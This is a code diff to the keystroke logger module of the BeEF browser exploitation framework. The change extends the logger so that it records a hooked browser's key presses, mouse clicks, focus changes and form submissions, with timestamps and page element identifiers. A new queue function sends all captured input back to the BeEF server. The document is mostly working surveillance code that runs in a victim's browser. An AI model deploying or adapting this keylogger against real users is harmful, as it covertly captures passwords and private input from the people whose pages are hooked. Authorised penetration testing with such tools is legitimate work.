@@ -5,6 +5,7 @@
  */
 beef.logger = {
 	
+	running: false,
 	/**
 	 * Holds events created by user, to be sent back to BeEF
 	 */
@@ -17,26 +18,61 @@ beef.logger = {
 	 * Contains current target of key presses
 	 */
 	target: null,
+	/**
+	 * Holds the time the logger was started
+	 */
+	time: null,
 	
 	/**
 	 * Starts the logger
 	 */
 	start: function() {
-		$j(document).keypress(function(e) { beef.logger.keypress(e) });
+		this.running = true;
+		var d = new Date();
+		this.time = d.getTime();
+		$j(document).keypress(
+			function(e) { beef.logger.keypress(e); }
+		).click(
+			function(e) { beef.logger.click(e); }
+		);
+		$j(window).focus(
+			function(e) { beef.logger.win_focus(e); }
+		).blur(
+			function(e) { beef.logger.win_blur(e); }
+		);
+		/*$j('form').submit(
+			function(e) { beef.logger.submit(e); }
+		);*/
 	},
 	
 	/**
 	 * Stops the logger
 	 */
 	stop: function() {
+		this.running = false;
+		clearInterval(this.timer);
 		$j(document).keypress(null);
 	},
 	
 	/**
-	 * Temporary function to output results to console.log
+	 * Click function fires when the user clicks the mouse.
 	 */
-	debug: function() {
-		window.console.log(this.events[(this.events.length - 1)]['timestamp'], this.events[(this.events.length - 1)]['data']);
+	click: function(e) {
+		this.events.push({'data':'User clicked: X: '+e.pageX+' Y: '+e.pageY+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target)});
+	},
+	
+	/**
+	 * Fires when the window element has regained focus
+	 */
+	win_focus: function(e) {
+		this.events.push({'data':'Browser has regained focus. @ '+beef.logger.get_timestamp()+'s'});
+	},
+	
+	/**
+	 * Fires when the window element has lost focus
+	 */
+	win_blur: function(e) {
+		this.events.push({'data':'Browser has lost focus. @ '+beef.logger.get_timestamp()+'s'});
 	},
 	
 	/**
@@ -49,7 +85,14 @@ beef.logger = {
 			beef.logger.push_stream();
 			this.target = e.target;
 		}
-		this.stream.push({'timestamp': Number(new Date()), 'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
+		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
+	},
+	
+	/**
+	 * Is called whenever a form is submitted
+	 */
+	submit: function(e) {
+		this.events.push({'data':'Form submission: Action: '+$j(e.target).attr('action')+' Method: '+$j(e.target).attr('method')+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target)});
 	},
 	
 	/**
@@ -58,19 +101,23 @@ beef.logger = {
 	push_stream: function() {
 		if (this.stream.length > 0)
 		{
-			this.events.push({'timestamp': beef.logger.get_timestamp(), 'data':beef.logger.parse_stream()});
+			this.events.push({'data':beef.logger.parse_stream()});
 			this.stream = [];
-			beef.logger.debug();
 		}
 	},
 	
 	/**
 	 * Translate DOM Object to a readable string
 	 */
-	get_dom_identifier: function() {
-		id = this.target.tagName.toLowerCase();
-		id += ($j(this.target).attr('id')) ? '#'+$j(this.target).attr('id') : ' ';
-		id += ($j(this.target).attr('name')) ? '('+$j(this.target).attr('name')+')' : '';
+	get_dom_identifier: function(target) {
+		target = (target == null) ? this.target : target;
+		var id = '';
+		if (target)
+		{
+			id = target.tagName.toLowerCase();
+			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
+			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
+		}
 		return id;
 	},
 	
@@ -79,8 +126,8 @@ beef.logger = {
 	 * @return {String} timestamp string
 	 */
 	get_timestamp: function() {
-		//return    time - date (seconds since first and last timestamp)
-		return '';
+		var d = new Date();
+		return ((d.getTime() - this.time) / 1000).toFixed(3);
 	},
 	
 	/**
@@ -90,12 +137,32 @@ beef.logger = {
 		var s = '';
 		for (var i in this.stream)
 		{
-			s += (this.stream[i]['modifiers']['alt']) ? 'Alt+' : '';
-			s += (this.stream[i]['modifiers']['ctrl']) ? 'Control+' : '';
-			s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
+			s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
+			s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
+			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
 			s += String.fromCharCode(this.stream[i]['char']);
 		}
-		return beef.logger.get_dom_identifier()+' > "'+ s+'"';
+		return 'User Typed: \"'+s+'\" @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier();
+	},
+	
+	/**
+	 * Queue results to be sent back to framework
+	 */
+	queue: function() {
+		beef.logger.push_stream();
+		if (this.events.length > 0)
+		{
+			var result = '';
+			var j = 0;
+			for (var i = this.events.length - 1; i >= 0; i--)
+			{
+				result += (i != this.events.length - 1) ? '&' : '';
+				result += 'stream'+j+'='+this.events[i]['data'];
+				j++;
+			}
+			beef.net.queue('/event', 0, result);
+			this.events = [];
+		}
 	}
 		
 };
